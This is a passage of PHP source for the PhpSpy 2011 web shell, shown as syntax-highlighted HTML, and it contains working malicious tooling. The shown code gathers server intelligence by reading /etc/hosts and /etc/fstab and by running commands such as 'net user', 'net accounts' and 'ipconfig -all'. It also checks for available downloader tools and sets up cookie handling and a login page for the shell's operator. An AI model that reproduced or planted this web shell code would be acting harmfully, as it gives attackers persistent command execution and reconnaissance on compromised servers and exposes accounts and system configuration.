<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Danger'</span>, <span style="color: #eeeeec; background-color: #2e3436;">implode(</span><span style="color: #ad7fa8; font-style: italic;">', '</span>,$<span style="color: #eeeeec;">temp</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">temp</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">downloaders</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">item</span>) 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">which(</span>$<span style="color: #eeeeec;">item</span>)){$<span style="color: #eeeeec;">temp</span>[]=$<span style="color: #eeeeec;">item</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Downloaders'</span>, <span style="color: #eeeeec; background-color: #2e3436;">implode(</span><span style="color: #ad7fa8; font-style: italic;">', '</span>,$<span style="color: #eeeeec;">temp</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Hosts'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span><span style="color: #ad7fa8; font-style: italic;">'/etc/hosts'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'HDD space'</span>, <span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">'df -h'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Mount options'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span><span style="color: #ad7fa8; font-style: italic;">'/etc/fstab'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'OS Version'</span>,<span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">'ver'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'Account Settings'</span>,<span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">'net accounts'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'User Accounts'</span>,<span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">'net user'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">secparam(</span><span style="color: #ad7fa8; font-style: italic;">'IP Configurate'</span>,<span style="color: #eeeeec; background-color: #2e3436;">execute(</span><span style="color: #ad7fa8; font-style: italic;">'ipconfig -all'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end</span>

<span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Undefined Action'</span>);
}

<span style="color: #729fcf;">?&gt;</span>
<span style="color: #8ae234;">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span style="color: #8ae234;">&lt;div</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;span</span> <span style="color: #8ae234;">style=</span><span style="color: #ad7fa8; font-style: italic;">"float:right;"</span><span style="color: #8ae234;">&gt;</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #eeeeec; background-color: #2e3436;">debuginfo(</span>);<span style="color: #eeeeec; background-color: #2e3436;">ob_end_flush(</span>);<span style="color: #729fcf;">?&gt;</span><span style="color: #8ae234;">&lt;/span&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">Powered</span> <span style="color: #f57900; font-weight: bold;">by</span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">title=</span><span style="color: #ad7fa8; font-style: italic;">"Build 20110502"</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"http://www.4ngel.net"</span> <span style="color: #8ae234;">target=</span><span style="color: #ad7fa8; font-style: italic;">"_blank"</span><span style="color: #8ae234;">&gt;</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'.'</span>,<span style="color: #ad7fa8; font-style: italic;">''</span>,<span style="color: #ad7fa8; font-style: italic;">'P.h.p.S.p.y'</span>);<span style="color: #729fcf;">?&gt;</span> <span style="color: #eeeeec; background-color: #2e3436;">2011</span><span style="color: #8ae234;">&lt;/a&gt;</span>. <span style="color: #eeeeec; background-color: #2e3436;">Copyright (</span><span style="color: #f57900; font-weight: bold;">C</span>) <span style="color: #eeeeec; background-color: #2e3436;">2004</span>-<span style="color: #eeeeec; background-color: #2e3436;">2011</span> <span style="color: #8ae234;">&lt;a</span> <span style="color: #8ae234;">href=</span><span style="color: #ad7fa8; font-style: italic;">"http://www.4ngel.net"</span> <span style="color: #8ae234;">target=</span><span style="color: #ad7fa8; font-style: italic;">"_blank"</span><span style="color: #8ae234;">&gt;</span><span style="color: #f57900; font-weight: bold;">Security</span> <span style="color: #f57900; font-weight: bold;">Angel</span> <span style="color: #eeeeec; background-color: #2e3436;">Team [</span><span style="color: #f57900; font-weight: bold;">S4T</span>]<span style="color: #8ae234;">&lt;/a&gt;</span> <span style="color: #f57900; font-weight: bold;">All</span> <span style="color: #f57900; font-weight: bold;">Rights</span> <span style="color: #f57900; font-weight: bold;">Reserved</span>.
<span style="color: #8ae234;">&lt;/div&gt;</span>
<span style="color: #8ae234;">&lt;/body&gt;</span>
<span style="color: #8ae234;">&lt;/html&gt;</span>

<span style="color: #729fcf;">&lt;?php</span>

<span style="color: #888a85;">/*</span><span style="color: #888a85;">======================================================</span>
<span style="color: #888a85;">&#20989;&#25968;&#24211;</span>
<span style="color: #888a85;">======================================================</span><span style="color: #888a85;">*/</span>

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">secparam</span>($<span style="color: #eeeeec;">n</span>, $<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">v</span> = <span style="color: #eeeeec; background-color: #2e3436;">trim(</span>$<span style="color: #eeeeec;">v</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;'</span>.$<span style="color: #eeeeec;">n</span>.<span style="color: #ad7fa8; font-style: italic;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;div class="infolist"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">strpos(</span>$<span style="color: #eeeeec;">v</span>, <span style="color: #ad7fa8; font-style: italic;">"\n"</span>) === <span style="color: #8ae234;">false</span>)
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">v</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;br /&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">else</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;pre&gt;'</span>.$<span style="color: #eeeeec;">v</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/pre&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/div&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">m</span>($<span style="color: #eeeeec;">msg</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">msg</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">'&lt;/div&gt;'</span>;
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">scookie</span>($<span style="color: #eeeeec;">key</span>, $<span style="color: #eeeeec;">value</span>, $<span style="color: #eeeeec;">life</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>, $<span style="color: #eeeeec;">prefix</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">timestamp</span>, $<span style="color: #8ae234;">_SERVER</span>, $<span style="color: #eeeeec;">cookiepre</span>, $<span style="color: #eeeeec;">cookiedomain</span>, $<span style="color: #eeeeec;">cookiepath</span>, $<span style="color: #eeeeec;">cookielife</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">key</span> = ($<span style="color: #eeeeec;">prefix</span> ? $<span style="color: #eeeeec;">cookiepre</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).$<span style="color: #eeeeec;">key</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">life</span> = $<span style="color: #eeeeec;">life</span> ? $<span style="color: #eeeeec;">life</span> : $<span style="color: #eeeeec;">cookielife</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">useport</span> = $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_PORT'</span>] == <span style="color: #eeeeec; background-color: #2e3436;">443</span> ? <span style="color: #eeeeec; background-color: #2e3436;">1</span> : <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">setcookie(</span>$<span style="color: #eeeeec;">key</span>, $<span style="color: #eeeeec;">value</span>, $<span style="color: #eeeeec;">timestamp</span>+$<span style="color: #eeeeec;">life</span>, $<span style="color: #eeeeec;">cookiepath</span>, $<span style="color: #eeeeec;">cookiedomain</span>, $<span style="color: #eeeeec;">useport</span>);
}<span style="background-color: #404040;"> </span>  
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">multi</span>($<span style="color: #eeeeec;">num</span>, $<span style="color: #eeeeec;">perpage</span>, $<span style="color: #eeeeec;">curpage</span>, $<span style="color: #eeeeec;">tablename</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">multipage</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">num</span> &gt; $<span style="color: #eeeeec;">perpage</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">page</span> = <span style="color: #eeeeec; background-color: #2e3436;">10</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">offset</span> = <span style="color: #eeeeec; background-color: #2e3436;">5</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">pages</span> = @<span style="color: #eeeeec; background-color: #2e3436;">ceil(</span>$<span style="color: #eeeeec;">num</span> / $<span style="color: #eeeeec;">perpage</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">page</span> &gt; $<span style="color: #eeeeec;">pages</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">from</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">to</span> = $<span style="color: #eeeeec;">pages</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">from</span> = $<span style="color: #eeeeec;">curpage</span> - $<span style="color: #eeeeec;">offset</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">to</span> = $<span style="color: #eeeeec;">curpage</span> + $<span style="color: #eeeeec;">page</span> - $<span style="color: #eeeeec;">offset</span> - <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">from</span> &lt; <span style="color: #eeeeec; background-color: #2e3436;">1</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">to</span> = $<span style="color: #eeeeec;">curpage</span> + <span style="color: #eeeeec; background-color: #2e3436;">1</span> - $<span style="color: #eeeeec;">from</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">from</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(($<span style="color: #eeeeec;">to</span> - $<span style="color: #eeeeec;">from</span>) &lt; $<span style="color: #eeeeec;">page</span> &amp;&amp; ($<span style="color: #eeeeec;">to</span> - $<span style="color: #eeeeec;">from</span>) &lt; $<span style="color: #eeeeec;">pages</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">to</span> = $<span style="color: #eeeeec;">page</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>($<span style="color: #eeeeec;">to</span> <span style="color: #8ae234;">&gt;</span> $<span style="color: #eeeeec;">pages</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">from</span> = $<span style="color: #eeeeec;">curpage</span> - $<span style="color: #eeeeec;">pages</span> + $<span style="color: #eeeeec;">to</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">to</span> = $<span style="color: #eeeeec;">pages</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(($<span style="color: #eeeeec;">to</span> - $<span style="color: #eeeeec;">from</span>) &lt; $<span style="color: #eeeeec;">page</span> &amp;&amp; ($<span style="color: #eeeeec;">to</span> - $<span style="color: #eeeeec;">from</span>) &lt; $<span style="color: #eeeeec;">pages</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">from</span> = $<span style="color: #eeeeec;">pages</span> - $<span style="color: #eeeeec;">page</span> + <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">multipage</span> = ($<span style="color: #eeeeec;">curpage</span> - $<span style="color: #eeeeec;">offset</span> <span style="color: #8ae234;">&gt;</span> <span style="color: #eeeeec; background-color: #2e3436;">1</span> &amp;&amp; $<span style="color: #eeeeec;">pages</span> &gt; $<span style="color: #eeeeec;">page</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'\', 1);"&gt;First&lt;/a&gt; '</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).($<span style="color: #eeeeec;">curpage</span> &gt; <span style="color: #eeeeec; background-color: #2e3436;">1</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'\', '</span>.($<span style="color: #eeeeec;">curpage</span> - <span style="color: #eeeeec; background-color: #2e3436;">1</span>).<span style="color: #ad7fa8; font-style: italic;">');"&gt;Prev&lt;/a&gt; '</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">i</span> = $<span style="color: #eeeeec;">from</span>; $<span style="color: #eeeeec;">i</span> &lt;= $<span style="color: #eeeeec;">to</span>; $<span style="color: #eeeeec;">i</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">multipage</span> .= $<span style="color: #eeeeec;">i</span> == $<span style="color: #eeeeec;">curpage</span> ? $<span style="color: #eeeeec;">i</span>.<span style="color: #ad7fa8; font-style: italic;">' '</span> : <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'\', '</span>.$<span style="color: #eeeeec;">i</span>.<span style="color: #ad7fa8; font-style: italic;">');"&gt;['</span>.$<span style="color: #eeeeec;">i</span>.<span style="color: #ad7fa8; font-style: italic;">']&lt;/a&gt; '</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">multipage</span> .= ($<span style="color: #eeeeec;">curpage</span> &lt; $<span style="color: #eeeeec;">pages</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'\', '</span>.($<span style="color: #eeeeec;">curpage</span> + <span style="color: #eeeeec; background-color: #2e3436;">1</span>).<span style="color: #ad7fa8; font-style: italic;">');"&gt;Next&lt;/a&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).($<span style="color: #eeeeec;">to</span> &lt; $<span style="color: #eeeeec;">pages</span> ? <span style="color: #ad7fa8; font-style: italic;">' &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'\', '</span>.$<span style="color: #eeeeec;">pages</span>.<span style="color: #ad7fa8; font-style: italic;">');"&gt;Last&lt;/a&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">multipage</span> = $<span style="color: #eeeeec;">multipage</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;Pages: '</span>.$<span style="color: #eeeeec;">multipage</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">multipage</span>;
}
<span style="color: #888a85;">// </span><span style="color: #888a85;">&#30331;&#38470;&#20837;&#21475;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">loginpage</span>() {
<span style="color: #729fcf;">?&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;style</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"text/css"</span><span style="color: #8ae234;">&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">input</span> {<span style="color: #f57900; font-weight: bold;">font</span>:<span style="color: #eeeeec; background-color: #2e3436;">11</span>px <span style="color: #f57900; font-weight: bold;">Verdana</span>;<span style="color: #f57900; font-weight: bold;">BACKGROUND</span>: <span style="color: #888a85;">#FFFFFF;height: 18px;border: 1px solid #666666;}</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;/style&gt;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #8ae234;">&lt;form</span> <span style="color: #8ae234;">method=</span><span style="color: #ad7fa8; font-style: italic;">"POST"</span> <span style="color: #8ae234;">action=</span><span style="color: #ad7fa8; font-style: italic;">""</span><span style="color: #8ae234;">&gt;</span>
